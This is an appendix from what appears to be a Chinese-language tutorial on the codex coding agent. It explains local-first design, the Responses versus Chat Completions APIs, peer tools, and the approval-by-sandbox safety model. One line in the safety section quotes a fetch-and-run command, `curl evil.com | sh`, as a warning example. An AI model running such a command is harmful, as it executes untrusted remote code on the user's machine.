---
title: "附录 A · 心智模型：本地优先 + Responses-vs-Chat-Completions + peer 比较"
chapter: A
slug: appendix-a-mental-model
est_read_min: 10
---

# 附录 A · 心智模型

> 上一节走了 codex 的代码骨架。这一节走"为什么 codex 长这样"——一些**非代码**维度的取舍。

---

## A1. 本地优先 agent 架构

codex 是**完全本地**的：

- 二进制装在用户机器上；
- 会话状态写在 `~/.codex/`；
- 模型 API 调用直接从用户机器出，OpenAI 的 endpoint 只见到一次请求一次回包，看不到中间状态；
- 所有 tool 执行在用户的进程里、在用户的文件系统上。

对比"云端 agent"（claude.ai 的 Computer Use、ChatGPT 的 web 版、Cursor 的服务端 agent）：云端要 spin 一个 sandbox VM，把代码 push 上去，让 agent 在远端运行，然后把 diff 拉回来。两种架构的边界是"代码和命令在哪里跑"。

| 维度 | 本地优先 (codex / claude-code / cline / aider) | 云端 (Cursor agent / ChatGPT Codex web) |
|---|---|---|
| 延迟 | 每个 tool 调用是本地 syscall，~ms | 每个 tool 调用要 round-trip 到 sandbox VM，~100ms |
| 隐私 | 代码不离开机器；模型只见 prompt | 代码 push 到第三方 sandbox，可能被日志 |
| 网络 | 不需要持续连接；只在 LLM 调用时联网 | 全程需要稳定连接 |
| 文件 | 直接读写真实项目文件 | 需要 push/pull diff |
| 调试 | 工具崩了你能 attach gdb；rollout 文件能 grep | 黑盒 |
| 安装 | 用户要装 codex + 配置 API key | 浏览器即用 |

codex 选本地优先的关键理由是**信任**：开发者愿意让 LLM 看代码、不愿意把代码上传给一个不熟悉的 cloud sandbox。这也是 claude-code 选本地的原因。

代价是：每次 codex 升级都要用户重装；多机器同步状态需要额外手段（codex 没做这个，rollout 文件不跨机器）。

## A2. Responses API vs Chat Completions API

OpenAI 同时提供两套 chat-shaped API：

- **Chat Completions**（`/v1/chat/completions`）—— 传统 OpenAI 接口。messages 数组里 user/assistant/tool 三种 role；assistant message 可以带 `tool_calls` 数组；前端按 `tool_calls.id` 把 tool 结果装进下一条 user message。
- **Responses API**（`/v1/responses`）—— 2024 末推出的新接口。不是按 messages 数组 push，而是 server 维护一个 thread；返回值是结构化的 `ResponseItem` 流，类型有 `Text` / `ToolUse` / `Reasoning` / `FileSearch` / `WebSearch` 等等。

codex 默认用 Responses API。学习版用 Chat Completions。两者形状不同但**所能表达的东西基本相同**——只有几个 Responses API 独有的：

- **`Reasoning` 流**：模型显式吐 chain-of-thought（tokens or summary）。CC 不暴露。但是除了 `o1` / `o3` 等 reasoning model，普通模型这块也是空。
- **server-side thread**：CC 是 stateless 的（messages 数组每次重传），Responses 让 server 记住。`thread_id` 可以跨调用复用——但是 codex 实际上**不依赖**这个 server-side state（毕竟 rollout 是本地的），只是利用了 streaming 形状。
- **结构化 tool-use 内嵌**：`ResponseItem::ToolUse` 直接是 typed object，CC 是 JSON-string-encoded args。

为什么学习版选 CC？

1. CC 是 lingua franca。Anthropic Messages、Gemini、Mistral、Together、Ollama 都对齐 CC 形状。读懂 CC 你能读懂所有非 OpenAI 的接口。
2. CC SSE 格式比 Responses 简单（`{choices:[{delta:{content:"x"}}]}` vs `event: response.text.delta\ndata: {...}`）。
3. CC 工具调用积累器（按 index 拼 args）是个有教学价值的难题；Responses 直接发完整 ToolUse 把这一难题藏起来。

所以：**读 codex-rs 之前先读 learn-codex；读 learn-codex 之前先读 OpenAI cookbook 那篇 Chat Completions tools 教程**——分层学。

## A3. 同行对比

```
                                  本地 vs 云端          IDE-resident      Tool-as-protocol
                                  ──────────────         ────────────      ─────────────────
codex                             local                  no (CLI/TUI)      yes (MCP)
claude-code (Anthropic)           local                  optional (--ide)  yes (claude SDK / hooks)
cursor agent (Anysphere)          cloud                  yes (Cursor)      no (proprietary)
cline (claude-dev fork)           local                  yes (VS Code)     yes (MCP)
aider                             local                  no (CLI)          no (Python libs)
ChatGPT Codex web                 cloud                  no (web)          no
```

**和 claude-code 最像**：本地、CLI/TUI、MCP 支持、approval policy + sandbox、durable rollout（ASS 文件 vs JSONL）。差异：claude-code 是 Anthropic 出的、绑定 Anthropic Messages API；codex 是 OpenAI 出的、绑 Responses API。codex 的 V4A patch DSL 比 claude-code 的 unified-diff-with-fuzzy-match 更严。

**和 cline 最像**：都是开源、社区驱动、强 MCP 支持。区别：cline 跑在 VS Code 进程里、UI 是 webview；codex 是独立 binary、UI 是 Ratatui。

**和 aider 最像**（在"git-aware CLI agent"维度）：都关注 patch + git。差异：aider 默认用 unified diff、不 sandbox、自动模式很激进；codex 严管 sandbox + approval。

**最不像 cursor agent**：cursor 把 agent 跑在云端 VM 里；codex 在你笔电的 shell 里。两套架构面向不同的安全模型——cursor 假设 enterprise 用户接受云 sandbox；codex 假设 hacker 不接受。

## A4. 两轴安全模型：approval × sandbox

codex 把"安全"拆成两个独立维度——很多新人混淆。

**approval_policy** 决定**什么时候问用户**：

| 策略 | 语义 |
|---|---|
| Never | 不问。CI / 自动化场景。 |
| OnFailure | 先跑，失败了问要不要重试。 |
| OnRequest | 每次都问。最保守。 |
| UnlessTrusted | 除非 execpolicy 标 allow，否则问。**默认**。 |
| Granular | 像 UnlessTrusted，但显示具体原因。 |

**sandbox_mode** 决定**真跑时能干什么**：

| 模式 | 文件 | 网络 |
|---|---|---|
| DangerFullAccess | 全部 R/W | 全部 |
| ReadOnly | 全 R, 0 W | localhost only |
| WorkspaceWrite | 全 R, cwd 可写 | localhost only |
| ExternalSandbox | (用户自定 wrapper) | (同) |

**这两个 axis 是正交的**：

- CI 跑 lint：`approval=Never + sandbox=ReadOnly`。永不阻塞，只读看代码。
- 本地交互调试：`approval=UnlessTrusted + sandbox=WorkspaceWrite`。常见命令直接跑，敏感命令问问，限制在工程目录里写文件。
- 远端 box 上让 agent 自由探索：`approval=OnFailure + sandbox=DangerFullAccess`。它要爆就让它爆，反正不是我的机器。

新手常见错误：**只配 approval，不配 sandbox**——一个 LLM "顺手" 跑了 `curl evil.com | sh`，user 点 yes，没有 sandbox 就完蛋。或者反过来，**只配 sandbox，approval=Never**——LLM 在 sandbox 里乱删 cwd 文件，因为反正 user 没拒绝过。两道防线都要配。

学习版（s05 + s06 + s08）把这两道防线都写出来了，但 s10 没把它们接进 main loop——这是 readers' exercise。

---

总结：codex 是一个**本地化、用 OpenAI 专属 API、按双轴安全模型设计的**编程 agent。读完这附录你应该可以把 codex 在"agent 圈"的位置画出来；下一附录是怎么继续读 codex-rs 上游源码。
